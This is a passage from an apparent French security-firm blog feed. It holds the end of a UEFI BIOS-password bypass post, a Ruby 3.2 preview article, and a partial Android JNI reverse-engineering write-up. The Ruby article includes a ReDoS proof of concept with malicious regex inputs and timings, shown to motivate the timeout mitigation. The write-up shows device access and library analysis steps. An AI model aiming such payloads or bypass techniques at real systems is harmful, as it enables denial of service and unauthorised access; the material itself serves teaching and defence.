<p>L’analyse de la carte mère et de l’UEFI fut très instructif. Le manque de documentation rend la tâche plus complexe mais avec de la motivation, il est possible de s’y retrouver.</p>



<p>L’accès direct à l’EEPROM (face clapet de l’ordinateur) rend le dump très facile. Il suffit d’ouvrir et nous pouvons directement nous brancher.</p>



<p>Le manque de contrôle sur l’UEFI est une source d’attaque. En effet, n’importe qui peut extraire, modifier et réinjecter dans l’EEPROM. Aucun CRC ni chiffrement n’est en place. De plus, l’authentification est facilement bypassable, l’UEFI n’utilise pas assez à son avantage les composants de la carte mère.</p>



<h2 id="à-propos-de-lauteur"><span class="has-inline-color has-secondary-color">À propos de l’auteur</span></h2>



<p>Article rédigé par Rémi ASSIDI, apprenti auditeur sécurité chez <a href="https://www.acceis.fr/">ACCEIS</a>.</p>
<p>The post <a rel="nofollow" href="https://www.acceis.fr/bypass-dun-mot-de-passe-bios-perdu-via-dump-et-injection-dun-uefi/">Bypass d’un mot de passe bios perdu via dump et injection d’un UEFI</a> appeared first on <a rel="nofollow" href="https://www.acceis.fr">ACCEIS</a>.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Ruby 3.2.0 Preview 1 : vivre dans le futur</title>
		<link>https://www.acceis.fr/ruby-3-2-0-preview-1-vivre-dans-le-futur/</link>
		
		<dc:creator><![CDATA[Alexandre Zanni]]></dc:creator>
		<pubDate>Fri, 17 Jun 2022 15:13:23 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[Développement]]></category>
		<category><![CDATA[ruby]]></category>
		<category><![CDATA[unicode]]></category>
		<category><![CDATA[wasm]]></category>
		<guid isPermaLink="false">https://www.acceis.fr/?p=2403</guid>

					<description><![CDATA[<p>Introduction Qu&#8217;est ce que les sites web suivants ont en commun en dehors de leur popularité : Airbnb, Github, Shopify, Groupon, Kickstarter, Gitlab, Slideshare, Hulu, Twitch, Les Pages Jaunes, Urban Dictionary, Zendesk, Soundcloud ? Ils s&#8217;appuient tous sur Ruby on Rails, l&#8217;un des frameworks MVC les plus utilisés pour écrire les backends d&#8217;applications web, et, [&#8230;]</p>
<p>The post <a rel="nofollow" href="https://www.acceis.fr/ruby-3-2-0-preview-1-vivre-dans-le-futur/">Ruby 3.2.0 Preview 1 : vivre dans le futur</a> appeared first on <a rel="nofollow" href="https://www.acceis.fr">ACCEIS</a>.</p>
]]></description>
										<content:encoded><![CDATA[<h2>Introduction</h2>
<p>Qu&#8217;est ce que les sites web suivants ont en commun en dehors de leur popularité : Airbnb, Github, Shopify, Groupon, Kickstarter, Gitlab, Slideshare, Hulu, Twitch, Les Pages Jaunes, Urban Dictionary, Zendesk, Soundcloud ?<br />
Ils s&#8217;appuient tous sur <a href="https://rubyonrails.org/">Ruby on Rails</a>, l&#8217;un des frameworks MVC les plus utilisés pour écrire les backends d&#8217;applications web, et, comme son nom l&#8217;indique, c&#8217;est un framework en Ruby.</p>
<p>Quel est le point commun entre les outils de sécurité suivants : Metasploit, Beef, WPScan, CeWL, Bettercap, WhatWeb, fingerprinter, envizon, Pipal, Evil-WinRM, PacketFu, Metasm, Hashview, Dradis ? Vous l&#8217;aurez deviné, ils sont tous écrits en Ruby.</p>
<p>N&#8217;est-ce pas une raison suffisante pour s&#8217;intéresser à la sécurité de Ruby ?</p>
<h2>Aperçu de Ruby 3.2.0</h2>
<p>La dernière version stable de Ruby disponible à l&#8217;heure où j&#8217;écris ces lignes est la version 3.1.2. Mais le 3 Avril 2022 une version <em>preview</em> de Ruby 3.2.0 a été rendue disponible.</p>
<p>Voyons voir ce que nous avons de beau au menu :</p>
<ul>
<li><a href="https://webassembly.org/">WASM</a>, introduction du support WebAssembly</li>
<li><a href="https://wasi.dev/">WASI</a>, introduction d&#8217;une interface système pour le WebAssembly</li>
<li><em>Regexp timeout</em>, une fonctionnalité d&#8217;expiration pour les expressions régulières</li>
<li>des méthodes sympas comme <code>String#byteindex</code></li>
<li>la mise à jour d&#8217;Unicode en version 14</li>
<li>plein d&#8217;autres choses mais qui nous intéressent moins</li>
</ul>
<p>Ca sert à quoi tout ça ? La bonne question pardi, c&#8217;est un peu le but de l&#8217;article !</p>
<h2>WASM et WASI</h2>
<p>Bon, la paraphrase de synthèse c&#8217;est drôle ni à écrire ni à lire donc voici une citation de <a href="https://fr.wikipedia.org/wiki/WebAssembly">Wikipedia</a> définissant WebAssembly :</p>
<blockquote>
<p>WebAssembly, abrégé wasm, est un standard du World Wide Web pour le développement d’applications. Il est conçu pour compléter JavaScript avec des performances supérieures. Le standard consiste en un bytecode, sa représentation textuelle et un environnement d&#8217;exécution dans un bac à sable compatible avec JavaScript. Il peut être exécuté dans un navigateur Web et en dehors. WebAssembly est standardisé dans le cadre du World Wide Web Consortium.</p>
<p>Comme WebAssembly ne spécifie qu&#8217;un langage de bas niveau, le bytecode est généralement produit en compilant un langage de plus haut niveau. Parmi les premiers langages supportés figurent Rust avec le projet/module (crate) wasm-bindgen ainsi que le C et C++, compilés avec Emscripten (basé sur LLVM). De nombreux autres langages de programmation possèdent aujourd&#8217;hui un compilateur WebAssembly, parmi lesquels : C#, Go, Java, Lua, Python ou Ruby.</p>
<p>Les navigateurs Web compilent le bytecode wasm dans le langage machine de l&#8217;hôte sur lequel ils sont utilisés avant de l&#8217;exécuter.</p>
</blockquote>
<p>Concrètement WASM est une machine virtuelle bas niveau (comme JVM) qui peut être incluse un peu partout de manière autonome mais surtout faite pour être intégrée aux navigateurs web. En gros, au lieu de faire tourner du JavaScript côté client, les applications pourront faire tourner un binaire pré-compilé, compatible avec JavaScript, mais avec de bien meilleurs performances et de manière plus sécurisée (exécution en sandbox).<br />
D&#8217;ailleurs on peut même charger un modèle WebAssembly depuis JavaScript et utiliser en JavaScript des objets exposés depuis le WebAssembly. Et pas besoin d&#8217;écrire de l&#8217;assembleur pour ça, on peut écrire du code dans des langages de programmation haut niveau et compiler le code en WASM. Donc on va pouvoir écrire du code côté client en Ruby !</p>
<p>WASM peut être aussi utilisé en dehors des navigateurs web, c&#8217;est pourquoi WASI propose une interface système modulaire pour les applications autonomes afin de communiquer avec le système d&#8217;exploitation.</p>
<p>WebAssembly est déjà <a href="https://developer.mozilla.org/fr/docs/WebAssembly#compatibilit%C3%A9_des_navigateurs">supporté par tous les navigateurs</a> (sauf Internet Explorer bien sûr &#x1f60f;).</p>
<p>On a toujours un peu de mal à se représenter ce que l&#8217;on peut faire avec quelque chose d&#8217;abstrait, voici des exemples ambitieux :</p>
<p><img src="https://www.acceis.fr/voy_content/uploads/2022/06/tweet1.png" alt="" /></p>
<p><img src="https://www.acceis.fr/voy_content/uploads/2022/06/tweet2.png" alt="" /></p>
<p>Cela pourra aussi permettre d&#8217;exécuter du code depuis n&#8217;importe quel langage dans n&#8217;importe quel autre langage via le support WASM ou d&#8217;écrire des applications Android.</p>
<p>Des sites web comme <a href="https://runrb.io/">runrb.io</a> ou <a href="https://try.ruby-lang.org/playground/#code=3.times+do%0A++print+&#039;Welcome+&#039;%0Aend&amp;engine=cruby-3.2.0dev">try ruby</a> permettent déjà d&#8217;exécuter du Ruby dans le navigateur.</p>
<h2>Regexp timeout</h2>
<p>Bon WASM c&#8217;était pour le côté futur, maintenant parlons sécu avec l&#8217;expiration d&#8217;expression régulière !</p>
<blockquote>
<ul>
<li>&quot;Mais dis-moi noraj, en quoi une regexp qui expire au bout de 3 secondes a un lien avec la sécurité ?&quot;</li>
<li>&quot;Moi&quot;</li>
<li>&quot;&#8230;&quot;</li>
</ul>
</blockquote>
<p>Et bien c&#8217;est simple, les personnes qui se baladent souvent sur <a href="https://security.snyk.io/">snyk Vulnerability DB</a> savent sans doute que les XSS ne sont pas les seules vulnérabilités qui ciblent les bibliothèques Javascript, il y a aussi les pollutions de paramètre et les ReDoS.<br />
Pour ceux qui ne connaîtraient pas les ReDoS, ce sont les <em>Regular expression denial of service</em>, attaque de complexité algorithmique qui produit un déni de service en fournissant une expression régulière et/ou une entrée dont l&#8217;évaluation prend beaucoup de temps.</p>
<p>Assez parlé, place à la pratique !</p>
<p>Voici une petite regex toute gentille, mais naïve, qui va vérifier que l&#8217;entrée utilisateur est bien une adresse email. Faisons un test de performance afin d&#8217;observer le temps d’exécution avec les 3 valeurs suivantes :</p>
<ul>
<li>une adresse email légitime</li>
<li>une adresse un peu malveillante (mais pas trop)</li>
<li>une adresse carrément malveillante (qui en vrai n&#8217;a pas grand chose à voir avec une adresse)</li>
</ul>
<pre><code class="language-ruby">require &#039;benchmark&#039;

n = 1
regexp = /[a-z]+@[a-z]+([a-z\.]+\.)+[a-z]+/
Benchmark.bm(7) do |x|
  x.report(&#039;legit payload:&#039;.ljust(25)) { regexp.match?(&#039;noraj.ruby@acceis.fr&#039;) }
  x.report(&#039;malicious payload:&#039;.ljust(25)) { regexp.match?(&#039;noraj@a...............................&#039;) }
  x.report(&#039;very malicious payload:&#039;.ljust(25)) { regexp.match?(&#039;noraj@a&#039; + &#039;.&#039; * 40) }
end</code></pre>
<p>Voyons voir ce que cela donne :</p>
<pre><code class="language-plaintext">$ ruby poc.rb
              user     system      total        real
legit payload:             0.000007   0.000001   0.000008 (  0.000005)
malicious payload:         0.187264   0.000682   0.187946 (  0.188438)
very malicious payload:   18.484982   0.000146  18.485128 ( 18.501884)</code></pre>
<p>Aïe ! Il se passe quoi ? &#x1f631;</p>
<ol>
<li>Pour l&#8217;adresse email légitime, on observe un temps d’exécution marginal</li>
<li>Pour l&#8217;adresse un peu malveillante, le temps d&#8217;exécution est fortement supérieur mais toujours peu important</li>
<li>Pour l&#8217;adresse carrément malveillante, plus de 18 secondes d&#8217;exécution</li>
</ol>
<p>Et encore, là, l&#8217;adresse carrément malveillante ne l&#8217;était pas tant que ça. Vous voyez déjà l&#8217;énorme différence entre la seconde adresse qui utilise 31 points et la 2ième qui en utilise 40. Et ca continue comme ca de manière exponentielle, donc imaginez maintenant que je mette 1000 points et que j&#8217;envoie 200 requêtes HTTP par seconde au serveur web, il se passera quoi ? C&#8217;est simple, le CPU va instantanément mourir et l’application ne répondra plus, un Déni de Service quoi ! La charge malveillant exploite la fonctionnalité de <em>backtracking</em> des expressions régulières.</p>
<p>Bon, vous voyez après cette longue introduction à quoi va servir le délai d&#8217;expiration.</p>
<p>Allez, on se la refait avec <code>Regexp#timeout</code> :</p>
<pre><code class="language-ruby">require &#039;benchmark&#039;

n = 1
regexp = /[a-z]+@[a-z]+([a-z\.]+\.)+[a-z]+/
Regexp.timeout = 1.0
Benchmark.bm(7) do |x|
  x.report(&#039;legit payload:&#039;.ljust(25)) { regexp.match?(&#039;noraj.ruby@acceis.fr&#039;) }
  x.report(&#039;malicious payload:&#039;.ljust(25)) { regexp.match?(&#039;noraj@a...............................&#039;) }
  x.report(&#039;very malicious payload:&#039;.ljust(25)) do
    begin
      regexp.match?(&#039;noraj@a&#039; + &#039;.&#039; * 40)
    rescue Regexp::TimeoutError
      print &#039;Wow ! Tout doux ! On va se détendre !&#039;
    end
  end
end</code></pre>
<p>Allez hop on exécute ça.</p>
<pre><code class="language-plaintext">$ ruby poc.rb
              user     system      total        real
legit payload:             0.000005   0.000002   0.000007 (  0.000004)
malicious payload:         0.182599   0.000000   0.182599 (  0.182919)
very malicious payload:  Wow ! Tout doux ! On va se détendre !  0.999344   0.000000   0.999344 (  1.000076)</code></pre>
<p>Terminé ! Rideau les ReDos ! Ciao ! C&#8217;est le &#x1f525; nan ?</p>
<h2>byteindex</h2>
<p><code>String#byteindex</code> n&#8217;a rien d&#8217;extraordinaire :</p>
<blockquote>
<p>Renvoie l&#8217;indice basé sur les octets de la première occurrence de la sous-chaîne pour une sous-chaîne donnée, ou nil si aucune n&#8217;est trouvée.</p>
</blockquote>
<pre><code class="language-ruby">irb(main):001:0&gt; &#039;acceis&#039;.byteindex(&#039;c&#039;)
=&gt; 1
irb(main):002:0&gt; &#039;acceis&#039;.byteindex(&#039;cc&#039;)
=&gt; 1</code></pre>
<p><code>String#byterindex</code> (avec le <code>r</code> en plus) fait la même chose mais pour la dernière occurrence au lieu de la première.</p>
<pre><code class="language-ruby">irb(main):003:0&gt; &#039;acceis&#039;.byterindex(&#039;c&#039;)
=&gt; 2
irb(main):004:0&gt; &#039;acceis&#039;.byterindex(&#039;cc&#039;)
=&gt; 1</code></pre>
<p>Bon bon&#8230; on est content mais c&#8217;est basique nan ?</p>
<p>Sauf que ce qui est cool, c&#8217;est que, comme la majorité des méthodes de manipulation de string en Ruby, cette méthode supporte Unicode.</p>
<p>Il y a 5 jours dans une semaine de travail donc nous allons exécuter cette routine 5 fois.<br />
Mais bon, ce qui nous intéresse surtout c&#8217;est de savoir quand est-ce la prochaine fois qu&#8217;on mange de la pizza ! Démonstration !</p>
<pre><code class="language-ruby">eat_sleep_pizza_repeat = &#039;&#x1f37d;&#xfe0f; &#x1f634; &#x1f355; &#x1f501;&#039; * 5
puts eat_sleep_pizza_repeat.byteindex(&#039;&#x1f355;&#039;)</code></pre>
<pre><code class="language-plaintext">$ ruby poc.rb
13</code></pre>
<h2>Unicode 14</h2>
<p>Trop bien ma pirouette avec <code>String#byteindex</code> sert de transition pour parler d&#8217;Unicode.</p>
<p>Vous n&#8217;êtes pas sans savoir que <a href="https://www.acceis.fr/attaques-unicode-rump-breizhctf-2k22/">j&#8217;aime les magouilles à base d&#8217;Unicode</a>.</p>
<p>Et bien Ruby 3.2.0 apportera la compatibilité avec <a href="http://www.unicode.org/versions/Unicode14.0.0/">Unicode v14.0.0</a>, soit 838 caractères dont 5 nouveaux scripts et 37 émojis.<br />
Des trucs vraiment indispensables comme &#x1fae0; &#x1faf5; &#x1faf6; &#x1f9cc; &#x1f6dd;. Et même des trucs pour la <a href="https://www.linkedin.com/posts/acceis_santexpo-cybersaezcuritaez-cyberattaque-activity-6932293956764372992-jvdn">SANTEXPO de Christophe, Steeve et Gwendal</a> comme &#x1fa7c; ou &#x1fa7b;.</p>
<h2>0xff</h2>
<p>Bon bah voilà ! C&#8217;était fun, on a bien rigolé et on s&#8217;est mangé une bonne tranche de futur. WebAssembly c&#8217;est le turfu comme dirait les jeunes, donc c&#8217;est appréciable que çà débarque dans Ruby. Une fois que son utilisation sera plus démocratisée, je n&#8217;ose même pas imaginer le nombre de nouveaux problèmes de sécurité que cela va faire émerger ; enfin j&#8217;espère &#x1f64a;, comme ça je pourrais vous faire une petit billet de blog sur le sujet. Maintenant vous avez le contexte pour vous protéger des ReDoS donc je ne veux plus en voir dans mes tests d&#8217;intrusion d&#8217;accord ? Et puis bon l&#8217;Unicode &#x2763;&#xfe0f;, on en reparle très bientôt.</p>
<h2>A propos de l&#8217;auteur</h2>
<p>Article écrit par Alexandre ZANNI alias <a href="https://pwn.by/noraj/">noraj</a>, Ingénieur en Test d&#8217;Intrusion chez <a href="https://www.acceis.fr/">ACCEIS</a>.</p>
<p>The post <a rel="nofollow" href="https://www.acceis.fr/ruby-3-2-0-preview-1-vivre-dans-le-futur/">Ruby 3.2.0 Preview 1 : vivre dans le futur</a> appeared first on <a rel="nofollow" href="https://www.acceis.fr">ACCEIS</a>.</p>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>Frida, JNI et 8.6</title>
		<link>https://www.acceis.fr/frida-jni-et-8-6/</link>
		
		<dc:creator><![CDATA[Lucas Gasté]]></dc:creator>
		<pubDate>Fri, 06 May 2022 04:57:00 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[Outils et méthodes]]></category>
		<category><![CDATA[Reverse]]></category>
		<guid isPermaLink="false">https://www.acceis.fr/?p=1992</guid>

					<description><![CDATA[<p>À l&#8217;occasion d&#8217;un de mes derniers pentests, je récupérais les prérequis contenant l&#8217;ensemble des informations nécessaires au bon déroulement de l&#8217;audit. Ces documents contiennent notamment : Le périmètre afin de ne pas arroser les plate-bandes des voisins Les comptes utilisateurs pour la partie boîte grise D&#8217;autres données en lien avec le contexte de l&#8217;audit Fort [&#8230;]</p>
<p>The post <a rel="nofollow" href="https://www.acceis.fr/frida-jni-et-8-6/">Frida, JNI et 8.6</a> appeared first on <a rel="nofollow" href="https://www.acceis.fr">ACCEIS</a>.</p>
]]></description>
										<content:encoded><![CDATA[
<p class="is-style-default">À l&#8217;occasion d&#8217;un de mes derniers pentests, je récupérais les prérequis contenant l&#8217;ensemble des informations nécessaires au bon déroulement de l&#8217;audit. </p>



<p class="is-style-default">Ces documents contiennent notamment : </p>



<ul class="has-small-font-size"><li>Le périmètre afin de ne pas arroser les plate-bandes des voisins</li><li>Les comptes utilisateurs pour la partie boîte grise</li><li>D&#8217;autres données en lien avec le contexte de l&#8217;audit</li></ul>



<p class="is-style-default">Fort heureux d&#8217;être en possession de ces données avant le lundi matin, mon œil est attiré par une liste de token avant même que mes doigts aient la possibilité d&#8217;effectuer le ALT + F4 du vendredi 16h59.<br><br>Au lieu du traditionnel <code><em>pentest/pentest1234</em></code>, chaque utilisateur possède une liste de 10 tokens, correspondant à 1 par jour d&#8217;audit. Agréablement surpris, retour à la réalité, 17h03, ALT-F4, envoi de la fiche d&#8217;heure supp&#8217; et mot doux pour mes collègues.</p>



<h2><span class="has-inline-color has-black-color">Contexte</span></h2>



<p class="has-normal-font-size">Une partie de cet audit concerne des boîtiers physiques sous Android avec lesquels les clients finaux interagissent via un écran. Ces boîtiers sont administrés via une interface web accessible derrière une authentification.<br><br>Quelques vulnérabilités me permettent de passer root sur la machine. Comme toujours un audit ne s&#8217;arrête pas là, le but étant d&#8217;être le plus exhaustif possible concernant les vulnérabilités présentes. Quelques jours passent et me voilà enfin rendu à l&#8217;analyse des mécanismes d&#8217;authentification.<br><br>Ayant récupéré l&#8217;APK du service, il m&#8217;est facile de parcourir l&#8217;ensemble des classes et méthodes Java à la recherche de celles en lien avec l&#8217;authentification. Grâce à quelques références, j&#8217;identifie la fonction prenant le nom d&#8217;utilisateur et le token du jour ; cependant, la fonction de vérification appelée n&#8217;est pas présente dans l&#8217;APK.<br><br> Cette dernière est chargée depuis une librairie externe via l&#8217;appel suivant :</p>



<pre class="wp-block-code has-small-font-size"><code lang="java" class="language-java">System.loadLibrary('client');</code></pre>



<p class="has-normal-font-size">Cette pratique consiste à exécuter du code natif (C/C++) et de récupérer le résultat au sein du contexte d&#8217;une application Java. La <a href="https://fr.wikipedia.org/wiki/Java_Native_Interface" target="_blank" rel="noreferrer noopener"><em>Java Native Interface</em> (JNI)</a> est une partie du <em>Java Development Kit</em> (JDK) qui permet à la <em>Java Virtual Machine</em> (JVM) d&#8217;appeler et d&#8217;être appelée par des applications natives (développées en C/C++). Cette pratique peut ainsi être exploitée lors de développement Android.<br><br>Le but de ces opérations sont multiples : </p>



<ul class="has-small-font-size"><li>Utiliser des librairies non disponibles en Java, pour de l’interaction avec le matériel par exemple</li><li>Dialoguer avec des applications développées nativement</li><li>Gagner en performance d&#8217;exécution (natif est par définition plus rapide qu&#8217;un langage s&#8217;exécutant via un autre programme)</li><li>Obfusquer / cacher des parties du code plus sensibles</li></ul>



<div class="wp-container-2 wp-block-group"><div class="wp-block-group__inner-container">
<div class="wp-container-1 wp-block-group"><div class="wp-block-group__inner-container">
<p></p>
</div></div>
</div></div>



<p class="has-normal-font-size">Aujourd&#8217;hui, c&#8217;est cette dernière raison qui va nous pousser à découvrir les mécanismes liés à JNI. En effet, il y a fort à parier que le caractère sensible de la méthode de vérification des tokens a poussé les développeurs à concevoir une application JNI plutôt qu&#8217;une classe Java.</p>



<p class="has-normal-font-size">Afin de préserver le caractère confidentiel des résultats d&#8217;audit, j&#8217;ai recréé un environnement similaire en développant une APK et une fonctionnalité de vérification de tokens.</p>



<h2><span class="has-inline-color has-black-color">Analyse préliminaire</span></h2>



<p>L&#8217;application cible se nomme ainsi &#8220;Acceis 8.6 connected beer tape&#8221; : cette application développée en Java en interne et s&#8217;exécutant directement sur une tireuse à bière connectée permet aux employés d&#8217;ACCEIS de récupérer leur quota quotidien de fine bière.<br><br>Afin de préserver ces précieux litres des collègues peu scrupuleux et de disposer d&#8217;un quota journalier de boisson, un mécanisme d&#8217;authentification avec un code quotidien a été mis en place. Ces codes sont générés uniquement pour les jours ouvrés, ce qui est problématique car cela m&#8217;empêche de passer au bureau récupérer mon quota lors de mes congés.</p>



<div class="wp-block-image is-style-default"><figure class="aligncenter size-full"><img width="368" height="668" src="https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650877304.jpg" alt="" class="wp-image-2035" srcset="https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650877304.jpg 368w, https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650877304-165x300.jpg 165w, https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650877304-33x60.jpg 33w, https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650877304-55x100.jpg 55w, https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650877304-110x200.jpg 110w" sizes="(max-width: 368px) 100vw, 368px" /><figcaption><em>Interface de connexion de la cible</em></figcaption></figure></div>



<p>Le but est alors d&#8217;analyser la fonctionnalité de vérification du token afin de trouver une vulnérabilité me permettant d&#8217;outrepasser la vérification ou alors, trouver un moyen de générer moi-même des codes !</p>



<h3><span class="has-inline-color has-primary-color">Récupération et analyse des sources</span></h3>



<p>Des vulnérabilités matérielles me permettent de prendre la main sur la tireuse connectée et d&#8217;obtenir un shell. Je m&#8217;y connecte ainsi via <em><code>a</code></em><code>d</code><em><code>b</code></em> et part à la recherche du service d&#8217;authentification.<br><br>En listant les processus, on s’aperçoit qu&#8217;un processus nommé <code>com.example.acceis_auth</code> existe. Une recherche des APK existant dans un répertoire possédant ce nom nous indique qu&#8217;une application est disponible dans le répertoire <code>com.example.acceis_auth-pNQZdceAhD_3ReADOyzfaA==</code></p>



<div class="wp-container-3 wp-block-group"><div class="wp-block-group__inner-container">
<blockquote class="wp-block-quote is-style-default"><p><em><span style="color:#342E2E" class="color">Depuis Android Oreo, les APK sont installés dans des dossiers avec des noms générés en partie aléatoirement https://stackoverflow.com/questions/47958947/base64-apk-path</span></em></p></blockquote>
</div></div>



<p>En listant les fichiers de ce répertoire on trouve ledit APK mais également une librairie native <em><code>libacceis_auth.so.</code></em></p>



<div class="wp-block-image"><figure class="aligncenter size-full"><img width="1624" height="620" src="https://www.acceis.fr/voy_content/uploads/2022/04/get-devices-data.png" alt="" class="wp-image-2042" srcset="https://www.acceis.fr/voy_content/uploads/2022/04/get-devices-data.png 1624w, https://www.acceis.fr/voy_content/uploads/2022/04/get-devices-data-300x115.png 300w, https://www.acceis.fr/voy_content/uploads/2022/04/get-devices-data-1024x391.png 1024w, https://www.acceis.fr/voy_content/uploads/2022/04/get-devices-data-768x293.png 768w, https://www.acceis.fr/voy_content/uploads/2022/04/get-devices-data-1536x586.png 1536w, https://www.acceis.fr/voy_content/uploads/2022/04/get-devices-data-60x23.png 60w, https://www.acceis.fr/voy_content/uploads/2022/04/get-devices-data-100x38.png 100w, https://www.acceis.fr/voy_content/uploads/2022/04/get-devices-data-200x76.png 200w" sizes="(max-width: 1624px) 100vw, 1624px" /><figcaption><em>récupération de l&#8217;APK cible</em> via adb</figcaption></figure></div>



<p>Via <em><code>adb pull</code>, </em>on transfert les deux fichiers sur notre machine et on commence la rétro-ingénierie. JADX est un <em>decompiler</em> avec une interface graphique qui va automatiser l&#8217;extraction des différentes ressources de l&#8217;APK étant donné que ce dernier est une archive contenant différents types de fichiers.</p>



<pre class="wp-block-code has-small-font-size"><code class="">$ unzip -l data/base.apk | head
Archive:  data/base.apk
  Length      Date    Time    Name
---------  ---------- -----   ----
     4632  1981-01-01 01:01   classes4.dex
       56  1981-01-01 01:01   META-INF/com/android/build/gradle/app-metadata.properties
     2632  1981-01-01 01:01   classes3.dex
   210576  1981-01-01 01:01   lib/x86/libacceis_auth.so
   468088  1981-01-01 01:01   classes2.dex
     3168  1981-01-01 01:01   AndroidManifest.xml</code></pre>



<div class="wp-container-4 wp-block-group"><div class="wp-block-group__inner-container">
<blockquote class="wp-block-quote"><p><span style="color:#342E2E" class="color">L&#8217;analyse du format des données de l&#8217;APK n&#8217;est pas le propos de l&#8217;article et passe donc cette partie.</span></p></blockquote>
</div></div>



<p>L&#8217;activité principale est très simpliste, il s&#8217;agit simplement d&#8217;un <em>callback</em> déclenché par le clic sur le bouton &#8220;connexion&#8221;. Lorsque le bouton est cliqué, les valeurs entrées par l&#8217;utilisateur dans les champs noms d&#8217;utilisateur et passwords sont récupérées.<br><br>Du pseudo-padding <em><code>PKCS#5</code></em> est rajouté au <em>username</em> via la méthode <code>pad</code> afin que l&#8217;utilisateur soit toujours d&#8217;une longueur de 8 caractères. La date actuelle est également récupérée puis mise sous la forme d&#8217;un <em>integer</em> : <code>23/04/2022 =&gt; 230422</code>.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img width="1024" height="451" src="https://www.acceis.fr/voy_content/uploads/2022/04/jadx-mainActivity-2-1024x451.png" alt="" class="wp-image-2156" srcset="https://www.acceis.fr/voy_content/uploads/2022/04/jadx-mainActivity-2-1024x451.png 1024w, https://www.acceis.fr/voy_content/uploads/2022/04/jadx-mainActivity-2-300x132.png 300w, https://www.acceis.fr/voy_content/uploads/2022/04/jadx-mainActivity-2-768x338.png 768w, https://www.acceis.fr/voy_content/uploads/2022/04/jadx-mainActivity-2-1536x676.png 1536w, https://www.acceis.fr/voy_content/uploads/2022/04/jadx-mainActivity-2-60x26.png 60w, https://www.acceis.fr/voy_content/uploads/2022/04/jadx-mainActivity-2-100x44.png 100w, https://www.acceis.fr/voy_content/uploads/2022/04/jadx-mainActivity-2-200x88.png 200w, https://www.acceis.fr/voy_content/uploads/2022/04/jadx-mainActivity-2.png 1779w" sizes="(max-width: 1024px) 100vw, 1024px" /><figcaption><em>décompilation de la classe MainActivity avec JADX, contenant le mécanisme d&#8217;authentification</em></figcaption></figure></div>



<p>La méthode de vérification est la suivante :</p>



<pre class="wp-block-code has-small-font-size"><code lang="java" class="language-java">String message = mainActivity.checkAuth(mainActivity.pad(username).getBytes(), password, currentDate) == 0 ? "Welcome " + username : "Authentication failed";</code></pre>



<p>Les paramètres passés sont de types<code> bytes[], bytes[], int</code> et la méthode retourne l&#8217;integer <code>0</code> si l&#8217;authentification est réussie. Dans ce cas positif, le message <code>Welcome {username}</code> est affiché sur le layout.</p>



<div class="wp-block-image is-style-default"><figure class="aligncenter size-full"><img width="371" height="682" src="https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650878662.jpg" alt="" class="wp-image-2051" srcset="https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650878662.jpg 371w, https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650878662-163x300.jpg 163w, https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650878662-33x60.jpg 33w, https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650878662-54x100.jpg 54w, https://www.acceis.fr/voy_content/uploads/2022/04/tuxpi.com_.1650878662-109x200.jpg 109w" sizes="(max-width: 371px) 100vw, 371px" /><figcaption><em>authentification avec token invalide</em></figcaption></figure></div>



<p>Un peu avant la méthode <code>onCreate</code>, on retrouve deux parties intéressantes :</p>



<pre class="wp-block-code has-small-font-size"><code lang="java" class="language-java">public native int checkAuth(byte[] bArr, byte[] bArr2, int i);

static {
    System.loadLibrary("acceis_auth");
}</code></pre>



<p>La première partie est le prototype de la fonction de vérification présente dans la librairie <code>libacceis_auth.so.</code> Le prototype doit être présent afin que l&#8217;APK possède la référence à la compilation bien que son adresse ne soit renseignée qu&#8217;au runtime.<br><br>La seconde partie est le chargement de la librairie <code>libacceis_auth.so</code> dans l&#8217;espace mémoire du service. Le nom utilisé est dit &#8220;non-décorée&#8221; car on ne mentionne que <code>acceis_auth</code> lors de l&#8217;appel de la fonction. C&#8217;est dû en partie au fait que la méthode <code>System.loadLibrary</code> soit indépendante de la plateforme (Linux, Windows) et, dans le cas présent, le fichier cherché est <code>libacceis_auth.so</code> mais aurait été <code>acceis_auth.dll </code>sous Windows.</p>



<div class="wp-container-5 wp-block-group"><div class="wp-block-group__inner-container">
<p><a href="https://docs.oracle.com/javase/7/docs/api/java/lang/System.html#loadLibrary(java.lang.String)">https://docs.oracle.com/javase/7/docs/api/java/lang/System.html#loadLibrary(java.lang.String)</a></p>



<h3><span class="has-inline-color has-primary-color">Analyse de la librairie native</span></h3>



<p>L&#8217;application ne contient rien d&#8217;autre d&#8217;intéressant, il est temps d&#8217;analyser <code>libacceis_auth.so</code>. </p>



<p>Une fois chargé dans notre décompilateur favori, on note la présence de la fonction <code>Java_com_example_acceis_1auth_MainActivity_checkAuth</code>.</p>
</div></div>



<p>Ce nom est important car il permet au loader de la librairie de résoudre le nom de fonctions demandées par l&#8217;application Java. Celui-ci est le résultat de la concaténation de plusieurs éléments :</p>



<ul><li>Java_</li><li>Le nom complet décorée de la classe  (<em>name mangling</em>)</li><li>_ Le nom décorée de la méthode </li></ul>



<p><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/jni/spec/design.html">https://docs.oracle.com/javase/7/docs/technotes/guides/jni/spec/design.html</a></p>



<p>Il s&#8217;agit ainsi de la fonction dont le prototype est défini dans la classe Java.</p>



